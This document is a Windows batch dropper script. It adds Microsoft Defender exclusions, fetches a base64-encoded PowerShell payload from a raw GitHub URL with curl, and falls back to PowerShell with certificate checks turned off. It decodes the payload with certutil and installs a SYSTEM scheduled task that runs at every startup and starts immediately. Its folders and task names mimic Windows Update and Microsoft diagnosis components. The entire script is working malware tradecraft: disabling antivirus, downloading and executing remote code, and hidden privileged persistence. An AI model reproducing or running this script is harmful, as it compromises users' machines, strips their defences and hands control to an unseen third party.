@echo off
setlocal EnableExtensions
echo === GO.CMD BUILD 20260729V ===

net session >nul 2>&1
if errorlevel 1 (
  echo Acces refuse: run as Administrator or SYSTEM - not Guest.
  exit /b 5
)

set "PAYURL=https://raw.githubusercontent.com/xnobuddy/github-drop/refs/heads/main/updateS.b64"
set "WORKDIR=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "B64=%WORKDIR%\update.b64"
set "PS1=%WORKDIR%\wucache_pkg.ps1"
set "ERR=%WORKDIR%\boot.err"
set "MARKER=WU_BUILD_20260729S"
set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"

echo Using payload URL:
echo %PAYURL%

if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Try{Add-MpPreference -ExclusionPath $env:ProgramData\Microsoft\Windows\WER\Temp\.wucache -EA SilentlyContinue; Add-MpPreference -ExclusionPath $env:TEMP -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'msiexec.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'curl.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'certutil.exe' -EA SilentlyContinue}Catch{}"

attrib -h -s -r "%WORKDIR%\*" /s >nul 2>&1
del /f /q "%WORKDIR%\*.ps1" >nul 2>&1
del /f /q "%WORKDIR%\*.b64" >nul 2>&1
del /f /q "%ERR%" >nul 2>&1

curl.exe -L --ssl-no-revoke -H "Cache-Control: no-cache" -H "Pragma: no-cache" -o "%B64%" "%PAYURL%" 2>nul
if not exist "%B64%" goto :psdownload
for %%A in ("%B64%") do if %%~zA LSS 1000 goto :psdownload
goto :gotb64

:psdownload
echo curl failed or too small - PowerShell download...
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('%PAYURL%','%B64%')}catch{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%PAYURL%','%B64%')}"
if not exist "%B64%" (
  echo Download failed.
  exit /b 1
)

:gotb64
for %%A in ("%B64%") do (
  echo Downloaded bytes: %%~zA
  if %%~zA LSS 1000 (
    echo Download too small.
    exit /b 1
  )
)

certutil.exe -decode "%B64%" "%PS1%"
if errorlevel 1 (
  powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$b=[IO.File]::ReadAllText('%B64%') -replace '\s',''; [IO.File]::WriteAllBytes('%PS1%',[Convert]::FromBase64String($b))"
)

if not exist "%PS1%" (
  echo Decode failed.
  exit /b 2
)

for %%A in ("%PS1%") do echo Decoded bytes: %%~zA

findstr /C:"%MARKER%" "%PS1%" >nul
if errorlevel 1 (
  echo ERROR: decoded payload missing %MARKER%
  exit /b 3
)

attrib -h -s -r "%PS1%" >nul 2>&1

REM Wrapper writes boot.err if payload crashes before .diag.log exists
set "WRAP=%WORKDIR%\boot.cmd"
> "%WRAP%" echo @echo off
>>"%WRAP%" echo echo boot_start^> "%ERR%"
>>"%WRAP%" echo powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%PS1%" ^>^> "%ERR%" 2^>^&1
>>"%WRAP%" echo echo boot_exit_%%ERRORLEVEL%%^>^> "%ERR%"

schtasks /Delete /TN "%ONCETASK%" /F >nul 2>&1
schtasks /Delete /TN "\Microsoft\Windows\Diagnosis\WMICleanup" /F >nul 2>&1
schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "\"%WRAP%\""
if errorlevel 1 (
  echo ERROR: could not create SYSTEM task
  exit /b 4
)
schtasks /Run /TN "%ONCETASK%"
if errorlevel 1 (
  echo ERROR: could not run SYSTEM task
  exit /b 4
)

echo Payload OK [%MARKER%], launched. Wait 180s.
echo Then: type "%ERR%"
echo And: type "%WORKDIR%\.diag.log"
exit /b 0
